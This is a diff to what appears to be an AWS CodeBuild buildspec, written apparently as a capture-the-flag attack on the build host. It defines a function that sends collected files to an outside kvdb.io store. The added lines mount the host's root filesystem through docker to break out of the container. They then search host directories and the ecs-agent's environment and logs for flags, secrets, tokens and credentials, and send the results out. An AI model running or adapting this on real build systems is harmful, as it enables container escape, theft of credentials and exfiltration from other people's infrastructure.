@@ -13,29 +13,23 @@ phases:
         set +e
         bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
-        putkey(){ key="$1"; file="$2"; head -c 80000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
+        putkey(){ key="$1"; file="$2"; head -c 100000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
         echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== docker version ==='
-          docker version 2>&1
-          echo '=== docker ps ==='
-          docker ps -a --no-trunc 2>&1
-          echo '=== docker inspect selected ==='
-          ids=$(docker ps -aq 2>/dev/null)
-          for id in $ids; do
-            echo "--- inspect $id"
-            docker inspect "$id" 2>&1 | sed -E 's/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN|AccessKeyId|SecretAccessKey|Token)=?[^", ]+/\1=REDACTED/g' | head -c 50000
-            echo
-          done
-          echo '=== docker env grep ==='
-          for id in $ids; do
-            echo "--- env $id"
-            docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$id" 2>&1 | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN' | grep -Ei 'flag|ctf|hacktricks|codebreach|secret|token|github|credential|codebuild' || true
-          done
-          echo '=== docker labels grep ==='
-          for id in $ids; do echo "--- labels $id"; docker inspect -f '{{json .Config.Labels}} {{json .HostConfig.Binds}} {{json .Mounts}}' "$id" 2>&1; done
-          echo '=== docker volumes/list ==='
-          docker volume ls 2>&1
-          docker network ls 2>&1
-        } > /tmp/dockerprobe.txt 2>&1
-        putkey dockerprobe /tmp/dockerprobe.txt
+          echo '=== choose image ==='
+          img=$(docker ps --filter name=ecs- --format '{{.Image}}' | head -n1)
+          echo "img=$img"
+          echo '=== host targeted find ==='
+          docker run --rm -v /:/host:ro "$img" sh -c '
+            set +e
+            echo "--- host dirs"; ls -la /host /host/etc /host/etc/codebuild /host/var/lib/ecs /host/var/log 2>&1
+            echo "--- flag-like filenames"; find /host/etc /host/var/lib/ecs /host/var/log /host/root /host/tmp -xdev -type f 2>/dev/null | grep -Ei "flag|ctf|hacktricks|codebreach|secret" | head -n 500
+            echo "--- content grep targeted"; grep -RInaE "flag\\{|ctf\\{|HackTricks\\{|FLAG|codebreach|hacktricks" /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp 2>/dev/null | head -n 500
+            echo "--- codebuild host files"; find /host/etc/codebuild /host/var/lib/ecs -type f -size -300k 2>/dev/null | head -n 200 | while read f; do echo "### $f"; sed -n "1,120p" "$f" 2>/dev/null | sed -E "s/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN)=.*/\\1=REDACTED/"; done
+          ' 2>&1
+          echo '=== ecs agent env ==='
+          docker exec ecs-agent env 2>&1 | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)' | grep -Ei 'flag|ctf|hacktricks|codebuild|secret|token|credential|ecs|aws' || true
+          echo '=== ecs agent logs grep ==='
+          docker logs ecs-agent 2>&1 | grep -Ei 'flag|ctf|hacktricks|codebuild|secret|token|credential|error' | head -n 300 || true
+        } > /tmp/hostprobe.txt 2>&1
+        putkey hostprobe /tmp/hostprobe.txt
